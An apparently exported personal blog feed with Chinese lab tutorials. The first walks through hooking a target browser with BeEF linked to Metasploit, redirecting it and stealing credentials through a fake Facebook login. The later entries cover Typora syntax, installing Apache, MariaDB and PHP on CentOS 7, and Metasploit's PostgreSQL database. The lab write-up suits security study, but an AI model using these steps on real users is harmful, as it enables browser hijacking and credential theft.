    <content><![CDATA[<h2 id="beef-metasploit利用浏览器获取shell"><a href="#beef-metasploit利用浏览器获取shell" class="headerlink" title="beef+metasploit利用浏览器获取shell"></a>beef+metasploit利用浏览器获取shell</h2><h3 id="利用beef获得目标主机shell"><a href="#利用beef获得目标主机shell" class="headerlink" title="利用beef获得目标主机shell"></a>利用beef获得目标主机shell</h3><h4 id="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"><a href="#原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。" class="headerlink" title="原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。"></a>原理：beef是一个用于合法研究和测试目的的专业浏览器漏洞利用框架。它允许有经验的渗透测试人员或系统管理员对目标进行攻击测试。攻击成功以后会加载浏览器劫持会话。BEEF可以利用XSS跨站脚本漏洞。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，将beef和metasploit进行关联，终端进入<code>beef-xss</code>目录，编辑文件<code>config.yaml</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195046684.png" alt="image-20211220195046684"></p>
<p>将文件中metasploit的<code>enable</code>的<code>false</code>修改为<code>true</code>,保存退出</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195427947.png" alt="image-20211220195427947"></p>
<p>进入 /usr/share/beef-xss/extensions/metasploit/目录，编辑<code>config.yaml</code>文件，把<code>host</code>的参数跟<code>callback_host</code>参数修改成kali主机ip</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195701762.png" alt="image-20211220195701762"></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220195837527.png" alt="image-20211220195837527"></p>
<p>将<code>custom path</code>的路径修改为 <code>/usr/share/metasploit-framework/</code>，保存退出</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200034953.png" alt="image-20211220200034953"></p>
<p>输入命令<code>/etc/init.d/postgresql start</code>，启动postgresql服务，输入命令<code>msfdb init</code>，初始化数据库</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200335286.png" alt="image-20211220200335286"></p>
<p>终端中输入msfconsole，启动metasploit，输入<code>load msgrpc ServerHost=ip Pass=abc123</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200632568.png" alt="image-20211220200632568"></p>
<p>打开新终端，输入cd /usr/share/beef-xss/，切换到beef-xss目录下，输入<code>./beef –x</code>加载模块</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220200906579.png" alt="image-20211220200906579"></p>
<p>打开浏览器，输入<code>http://ip:3000/ui/panel</code>，访问<code>beef</code>，账号密码都是<code>beef</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201119958.png" alt="image-20211220201119958"></p>
<p>在靶机访问<code>http://ip:3000/demos/butcher/index.html</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201335685.png" alt="image-20211220201335685"></p>
<p>返回kali,看到beef自动连接客户端，提示目标已上线</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201458346.png" alt="image-20211220201458346"></p>
<p>单击目标ip,<code>Details</code>标签显示了客户端主机详细信息，如火狐浏览器，IE6，浏览器支持flash，支持vbscript脚本，操作系统类型</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220201907661.png" alt="image-20211220201907661"></p>
<p>单击<code>commands</code>标签，显示插件</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202003645.png" alt="image-20211220202003645"></p>
<p>终端进入/var/www/html（apache2默认网站目录）,编辑一个<code>xss.html</code>文件，自定义xss.html网页</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202448920.png" alt="image-20211220202448920"></p>
<p>终端修改/etc/apache2/ports.conf，修改默认端口号为8080，保存退出</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202622345.png" alt="image-20211220202622345"></p>
<p>终端启动<code>service apache2 start</code>，没有显示表示启动成功</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202805838.png" alt="image-20211220202805838"></p>
<p>靶机输入<a href="http://192.168.1.2:8080/xss.html%E8%AE%BF%E9%97%AE%E7%BD%91%E9%A1%B5">http://192.168.1.2:8080/xss.html访问网页</a></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220202925168.png" alt="image-20211220202925168"></p>
<p>返回kali，刷新网页，单击目标ip，点击commans,依次选择<code>Browser</code>,<code>Hooked Domain</code>,<code>Redirect Browser</code>,单击最右侧的<code>RedirectURL</code>,输入<a href="http://192.168.1.2:3000/demos/butcher/index.html,%E4%BD%86%E5%8D%95%E5%87%BB%60Execute%60%EF%BC%8C%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E8%87%AA%E5%8A%A8%E8%AE%BF%E9%97%AE%E6%AD%A4%E7%BD%91%E9%A1%B5">http://192.168.1.2:3000/demos/butcher/index.html,但单击`Execute`，目标主机自动访问此网页</a></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203358764.png" alt="image-20211220203358764"></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203430757.png" alt="image-20211220203430757"></p>
<p>单击commands标签，选择<code>Social Engineering</code>,<code>Pretty Theft</code>,最右侧选择框模板弹出，选择facebook模板，窃取账号密码，单击Execute，执行攻击</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203726251.png" alt="image-20211220203726251"></p>
<p>靶机弹出facebook登录对话框，输入账号密码就会被窃取</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203846921.png" alt="image-20211220203846921"></p>
<p>在beef的<code>Module Result History</code>标签页中，单击历史记录，发现窃取到账号密码</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/beef-metasploit%E5%88%A9%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E8%8E%B7%E5%8F%96shell/image-20211220203919754.png" alt="image-20211220203919754"></p>
<p>实验完成</p>
]]></content>
      <tags>
        <tag>beef</tag>
        <tag>msf</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Typora简单语法</title>
    <url>/blog/2021/11/24/Typora%E7%AE%80%E5%8D%95%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<h2 id="Typora简单语法"><a href="#Typora简单语法" class="headerlink" title="Typora简单语法"></a>Typora简单语法</h2><p>​        typora是一款极致简洁的markdown文本编辑器，支持即时渲染技术，是编写markdown的好手，非常的好用。</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><strong>Typora官网下载链接:</strong> <a href="https://www.typora.io/#download">https://www.typora.io/#download</a></p>
<p>官网速度是有点慢的，所以这里附上windows64位的链接</p>
<p><strong>百度网盘:</strong> 链接：<a href="https://pan.baidu.com/s/1BCdw0eBPushTxzfz71S0gA">https://pan.baidu.com/s/1BCdw0eBPushTxzfz71S0gA</a><br>提取码：2n9x </p>
<h3 id="一、标题"><a href="#一、标题" class="headerlink" title="一、标题"></a>一、标题</h3><p>标题的语法是**#+空格+文字**，一个#是一级标题，两个#是二级标题，以此类推。</p>
<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4><h5 id="五级标题"><a href="#五级标题" class="headerlink" title="五级标题"></a>五级标题</h5><h6 id="六级标题"><a href="#六级标题" class="headerlink" title="六级标题"></a>六级标题</h6><p>快捷键: <strong>ctrl+1~6</strong></p>
<p>清除: 标题放在要清除的行，按下ctrl+0。</p>
<h3 id="文字加粗、斜体、加粗斜体"><a href="#文字加粗、斜体、加粗斜体" class="headerlink" title="文字加粗、斜体、加粗斜体"></a>文字加粗、斜体、加粗斜体</h3><p>用一对 * 把文字包含就是斜体，(<strong>不要加空格</strong>)。<em>斜体</em></p>
<p>用两对 * 把文字包含就是粗体，(<strong>不要加空格</strong>)。<strong>粗体</strong><br>加粗符号有规则，前面的**不能跟符号，如果跟符号，则前面有空格，后面的**前面不能有符号，如果有符号，则后面有空格<br>如**(abc)**,应写成空格**(abc)**空格,<strong>(abc)</strong>,</p>
<p>用三对 * 把文字包含就是加粗斜体，(<strong>不要加空格</strong>)。 <em><strong>加粗斜体</strong></em></p>
<h3 id="插入表格"><a href="#插入表格" class="headerlink" title="插入表格"></a>插入表格</h3><p>第一种：</p>
<p>快捷键： ctrl+t  就会出现一个空表格</p>
<p><img src="/blog/blog/2021/11/24/Typora%E7%AE%80%E5%8D%95%E8%AF%AD%E6%B3%95/Users\23102\AppData\Roaming\Typora\typora-user-images\image-20210806222649296.png" alt="image-20210806222649296"></p>
<table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>第二种：</p>
<p>|国籍|省份|市区|</p>
<table>
<thead>
<tr>
<th>国籍</th>
<th>省份</th>
<th>市区</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="超链接的使用"><a href="#超链接的使用" class="headerlink" title="超链接的使用"></a>超链接的使用</h3><p>第一种：&lt;<a href="http://www.baidu.com/&gt;">http://www.baidu.com\&gt;</a></p>
<p>第二种： ctrl+ k [百度](http:<a href="http://www.baidu.com/">www.baidu.com\</a>)</p>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p>第一种： <a href="http://www.baidu.com/">http://www.baidu.com</a></p>
<p>第二种： <a href="http://www.baidu.com/">百度</a></p>
<h3 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h3><p>使用```c+回车</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="高亮"><a href="#高亮" class="headerlink" title="高亮"></a>高亮</h3><p>​        首先打开文件，选择偏好设置，找到markdown选项，把里面的高亮打上勾。语法： ==高亮==</p>
<p>==高亮==</p>
<h3 id="插入图片"><a href="#插入图片" class="headerlink" title="插入图片"></a>插入图片</h3><p>​        可以直接复制粘贴</p>
<p><img src="https://img1.baidu.com/it/u=3863603029,2101366666&fm=26&fmt=auto&gp=0.jpg" alt="img"></p>
]]></content>
      <tags>
        <tag>typora</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7安装apache</title>
    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85apache/</url>
    <content><![CDATA[<h2 id="centos7-安装Apache"><a href="#centos7-安装Apache" class="headerlink" title="centos7 安装Apache"></a>centos7 安装Apache</h2><h3 id="实验准备：vmware上安装的centos7"><a href="#实验准备：vmware上安装的centos7" class="headerlink" title="实验准备：vmware上安装的centos7"></a>实验准备：vmware上安装的centos7</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br></pre></td></tr></table></figure>

<h3 id="安装Apache："><a href="#安装Apache：" class="headerlink" title="安装Apache："></a>安装Apache：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install httpd</span></span><br></pre></td></tr></table></figure>

<h3 id="查看http状态："><a href="#查看http状态：" class="headerlink" title="查看http状态："></a>查看http状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; disabled; vendor preset: disabled)</span><br><span class="line">   Active: inactive (dead)</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br></pre></td></tr></table></figure>

<h3 id="启动Apache并设置为开机启动："><a href="#启动Apache并设置为开机启动：" class="headerlink" title="启动Apache并设置为开机启动："></a>启动Apache并设置为开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start httpd</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> httpd</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/httpd.service to /usr/lib/systemd/system/httpd.service.</span><br></pre></td></tr></table></figure>

<h3 id="再次查看Apache状态："><a href="#再次查看Apache状态：" class="headerlink" title="再次查看Apache状态："></a>再次查看Apache状态：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl status httpd</span></span><br><span class="line">● httpd.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/httpd.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since 六 2021-08-28 21:28:05 CST; 1min 17s ago</span><br><span class="line">     Docs: man:httpd(8)</span><br><span class="line">           man:apachectl(8)</span><br><span class="line"> Main PID: 1358 (httpd)</span><br><span class="line">   Status: &quot;Total requests: 0; Current requests/sec: 0; Current traffic:   0 B/sec&quot;</span><br><span class="line">   CGroup: /system.slice/httpd.service</span><br><span class="line">           ├─1358 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1359 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1360 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1361 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           ├─1362 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line">           └─1363 /usr/sbin/httpd -DFOREGROUND</span><br><span class="line"></span><br><span class="line">8月 28 21:27:34 cn7 systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">8月 28 21:27:54 cn7 httpd[1358]: AH00558: httpd: Could not reliably determine the server&#x27;s fully qualified dom...essage</span><br><span class="line">8月 28 21:28:05 cn7 systemd[1]: Started The Apache HTTP Server.</span><br><span class="line">Hint: Some lines were ellipsized, use -l to show in full.</span><br></pre></td></tr></table></figure>

<h3 id="查看Apache版本"><a href="#查看Apache版本" class="headerlink" title="查看Apache版本"></a>查看Apache版本</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> httpd -v</span></span><br><span class="line">Server version: Apache/2.4.6 (CentOS)</span><br><span class="line">Server built:   Nov 16 2020 16:18:20</span><br></pre></td></tr></table></figure>

<h3 id="使用ss查看端口监听状态"><a href="#使用ss查看端口监听状态" class="headerlink" title="使用ss查看端口监听状态"></a>使用ss查看端口监听状态</h3><p>（ss -tnl     [t：tcp,n：数字显示,l：监听]）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> ss -tnl</span></span><br><span class="line">State      Recv-Q Send-Q               Local Address:Port                              Peer Address:Port</span><br><span class="line">LISTEN     0      128                              *:22                                           *:*</span><br><span class="line">LISTEN     0      100                      127.0.0.1:25                                           *:*</span><br><span class="line">LISTEN     0      128                           [::]:22                                        [::]:*</span><br><span class="line">LISTEN     0      100                          [::1]:25                                        [::]:*</span><br><span class="line">LISTEN     0      128                           [::]:80                                        [::]:*</span><br></pre></td></tr></table></figure>

<h3 id="访问虚拟机的ip地址"><a href="#访问虚拟机的ip地址" class="headerlink" title="访问虚拟机的ip地址"></a>访问虚拟机的ip地址</h3><p>如果能访问即成功。</p>
]]></content>
      <tags>
        <tag>apache</tag>
        <tag>centos7</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7安装mariadb</title>
    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85mariadb/</url>
    <content><![CDATA[<h2 id="centos7安装mariadb"><a href="#centos7安装mariadb" class="headerlink" title="centos7安装mariadb"></a>centos7安装mariadb</h2><p>mariadb是MYSQL的一个分支，语法基本和mysql一样，而且兼容mysql，centos7中自带了mariadb的软件包。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> cat /etc/redhat-release</span></span><br><span class="line">CentOS Linux release 7.9.2009 (Core)</span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> uname -a</span></span><br><span class="line">Linux cn7 3.10.0-1160.el7.x86_64 #1 SMP Mon Oct 19 16:18:59 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<h3 id="安装mariadb："><a href="#安装mariadb：" class="headerlink" title="安装mariadb："></a>安装mariadb：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install mariadb-server</span></span><br></pre></td></tr></table></figure>

<h3 id="开启mariadb并设置开机启动："><a href="#开启mariadb并设置开机启动：" class="headerlink" title="开启mariadb并设置开机启动："></a>开启mariadb并设置开机启动：</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl start mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl <span class="built_in">enable</span> mariadb</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/mariadb.service to /usr/lib/systemd/system/mariadb.service.</span><br></pre></td></tr></table></figure>

<h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql_secure_installation</span></span><br><span class="line">Enter current password for root (enter for none):  # 输入数据库超级管理员root的密码(注意不是系统root的密码)，第一次进入还没有设置密码则直接回车</span><br><span class="line"></span><br><span class="line">Set root password? [Y/n]  # 设置密码，y</span><br><span class="line"></span><br><span class="line">New password:  # 新密码</span><br><span class="line">Re-enter new password:  # 再次输入密码</span><br><span class="line"></span><br><span class="line">Remove anonymous users? [Y/n]  # 移除匿名用户， y</span><br><span class="line"></span><br><span class="line">Disallow root login remotely? [Y/n]  # 拒绝root远程登录，n，不管y/n，都会拒绝root远程登录</span><br><span class="line"></span><br><span class="line">Remove test database and access to it? [Y/n]  # 删除test数据库，y：删除。n：不删除，数据库中会有一个test数据库，一般不需要</span><br><span class="line"></span><br><span class="line">Reload privilege tables now? [Y/n]  # 重新加载权限表，y</span><br></pre></td></tr></table></figure>

<h3 id="启动数据库"><a href="#启动数据库" class="headerlink" title="启动数据库"></a>启动数据库</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> mysql -u root -p</span></span><br><span class="line">Enter password:</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection id is 2</span><br><span class="line">Server version: 5.5.68-MariaDB MariaDB Server</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; quit;</span><br><span class="line">Bye</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>centos7</tag>
        <tag>mariadb</tag>
      </tags>
  </entry>
  <entry>
    <title>centos7安装php</title>
    <url>/blog/2021/11/24/centos7%E5%AE%89%E8%A3%85php/</url>
    <content><![CDATA[<h2 id="centos7安装php"><a href="#centos7安装php" class="headerlink" title="centos7安装php"></a>centos7安装php</h2><p>环境是apache2+mariadb+php</p>
<p>先安装php</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php</span></span><br></pre></td></tr></table></figure>

<p>安装php相关组件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> yum -y install php-mysql php-gd php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-bcmath php-mhash</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart mariadb</span></span><br><span class="line"><span class="meta">[root@cn7]/#</span><span class="bash"> systemctl restart httpd</span></span><br></pre></td></tr></table></figure>

<p>通过php -v 查看信息</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> php -v</span></span><br><span class="line">PHP 5.4.16 (cli) (built: Apr  1 2020 04:07:17)</span><br><span class="line">Copyright (c) 1997-2013 The PHP Group</span><br><span class="line">Zend Engine v2.4.0, Copyright (c) 1998-2013 Zend Technologies</span><br></pre></td></tr></table></figure>

<p>进入/var/www/html目录编写一个测试页面</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">[root@cn7]/var/www/html#</span><span class="bash"> vim index.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最后访问页面，有php相关信息成功</p>
]]></content>
      <tags>
        <tag>centos7</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>metasploit之PostgreSQL</title>
    <url>/blog/2021/12/21/metasploit%E4%B9%8BPostgreSQL/</url>
    <content><![CDATA[<h2 id="metasploit之PostgreSQL"><a href="#metasploit之PostgreSQL" class="headerlink" title="metasploit之PostgreSQL"></a>metasploit之PostgreSQL</h2><h3 id="目的：-Metasploit自带数据库（PostgreSQL）操作"><a href="#目的：-Metasploit自带数据库（PostgreSQL）操作" class="headerlink" title="目的： Metasploit自带数据库（PostgreSQL）操作"></a>目的： Metasploit自带数据库（PostgreSQL）操作</h3><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><p><code>db_status</code>     查看数据库连接状态</p>
<p><code>db_connect</code>  链接数据库</p>
<p><code>db_disconnect</code>    断开连接</p>
<p><code>vulns</code>     查看数据库扫描的主机的漏洞</p>
<p><code>workspace</code>   工作空间，相对于独立的</p>
<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msfconsole,<code>db_status</code>查看数据库连接状态，如果已连接执行<code>db_disconnect</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/1.PNG"></p>
<p>exit退出软件，执行<code>service postgresql start</code>,启动数据库，<code>netstat -ntlp | grep postgre</code>查询是否启动成功，端口为<code>5432</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/2.PNG"></p>
<p>重新运行msf,<code>db_status</code>查看是否连接<code>数据库</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/3.PNG"></p>
<p><code>db_disconnect</code>断开连接，<code>db_status</code>查看连接状态</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/4.PNG"></p>
<p>手动使用命令连接数据库，须知<code>数据库名</code>，<code>用户名</code>，<code>ip</code>以及<code>密码</code>，新建窗口，查询数据库配置文件，执行<code>find / -name database.yml</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/5.PNG"></p>
<p><code>cat /usr/share/metasploit-framework/config/database.yml</code>，查看配置文件</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/6.PNG"></p>
<p>返回msf界面，db_connect查看使用方法，选择第二种<code>db_connect 用户名:密码@ip/数据库名</code>，配置信息是<code>development</code>标签内的</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/7.PNG"><br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/8.PNG"></p>
<p>退出msf，执行<code>su postgres</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/9.PNG"></p>
<p>创建新用户sub1及密码：<code>createuser sub1 -P</code>,回车并输入密码123456两次，<code>createdb --owner=sub1 test</code>连接数据库test，完成后exit退出</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/10.PNG"></p>
<p>运行msfconsole，db_disconnect断开连接，执行<code>db_connect sub1:123456@localhost/test</code>连接刚才的数据库，<code>db_status</code>查看状态</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/11.PNG"></p>
<p>退出msf,编辑<code>/etc/postgresql/9.5/main/postgresql.conf</code>文件，<code>shift+：</code>输入<code>set number</code>调出行号</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/12.PNG"></p>
<p>找到59行，将#去掉，并且把<code>localhost</code>改为*，88行去掉#,然后保存退出</p>
